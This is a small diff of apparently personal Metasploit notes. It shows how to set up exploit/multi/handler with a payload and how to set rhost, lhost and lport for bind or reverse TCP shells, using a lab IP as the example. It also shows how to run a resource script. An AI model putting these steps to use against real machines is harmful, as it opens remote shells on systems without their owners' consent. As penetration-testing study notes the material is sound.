@@ -12,7 +12,7 @@ use exploit/multi/handler
 set payload <path/to/payload/payload_name>
 in case of bind_shell_tcp, write "set rhost <target ip>" and "set lport <port>"
 show options     -----    shows the missing fields
-set LHOST/LPORT=<input>
+set lhost/lport <input> [ip address of kali machine in case of reverse tcp] eg:[set lhost 192.168.56.34]
 exploit
 help    ------   show a list of commands of what we can do
 msfconsole -r /path/to/list.txt = msf custop scritp run 
